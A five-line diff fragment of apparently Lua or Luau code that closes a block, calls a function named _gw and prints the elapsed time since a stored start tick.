+    end
+end)
+
+_gw();
+print(tick() - _startT)
